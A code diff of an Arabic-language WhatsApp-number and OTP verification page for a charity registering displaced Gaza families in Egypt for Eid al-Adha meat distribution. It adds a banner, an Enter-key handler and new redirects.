@@ -1,9 +1,13 @@
 <div class="page page-center">
   <div class="container container-tight py-4">
     <div class="text-center mb-4">
-      <a href="." class="navbar-brand navbar-brand-autodark">
+      <a href="/family" class="navbar-brand navbar-brand-autodark">
         <img src="/static/images/logo-dark.png" height="64" alt="Tabler" class="navbar-brand-image">
       </a>
+      <p class="text-secondary fs-2 my-2 p-4">في عيد الأضحى نمد يدًا بالخير لأهلنا الأعزاء النازحين من قطاع غزة في
+        جمهوية مصر
+        العربية نرجو تعبئة هذا النموذج لمساعدتنا في تنظيم عملية حصر الاسماء و توزيع اللحوم
+        جمعية الخدمت _ اوروبا</p>
     </div>
     <div class="card card-md" dir="rtl">
       <div class="card-body">
@@ -13,7 +17,8 @@
 
           <div class="mb-3">
             <label class="form-label">رقم الواتساب مع المقدمة الدولية</label>
-            <input id="tel" type="tel" class="text-center form-control" placeholder="+9705XXXXXXXX" autocomplete="off" required>
+            <input id="tel" type="tel" class="text-center form-control" placeholder="+9705XXXXXXXX" autocomplete="off"
+              required>
           </div>
 
           <div class="form-footer">
@@ -76,6 +81,21 @@
 
 
 <script>
+
+  $('input').on('keypress', function (e) {
+    if (e.which === 13) {
+      const isSendCodeContainer = $('#container-send-code').hasClass('d-none') === false;
+      const isVerifyCodeContainer = $('#container-verify-code').hasClass('d-none') === false;
+      if (isSendCodeContainer) {
+        $('#send-code').click();
+      }
+      if (isVerifyCodeContainer) {
+        $('#verify-code').click();
+      }
+    }
+  });
+
+
   $('.otp-input').on('input', function () {
     $(this).closest('.col-2').next('.col-2').find('.otp-input').focus()
   });
@@ -151,9 +171,10 @@
       contentType: 'application/json',
       data: JSON.stringify({ code, name }),
       success: function (response) {
-        window.location.href = '/';
+        window.location.href = '/family';
       },
-      error: function (xhr, status, error) {F
+      error: function (xhr, status, error) {
+        F
         $(elem).html(currentBtnHTML);
         if (status != 400) {
           $(elem).after(`
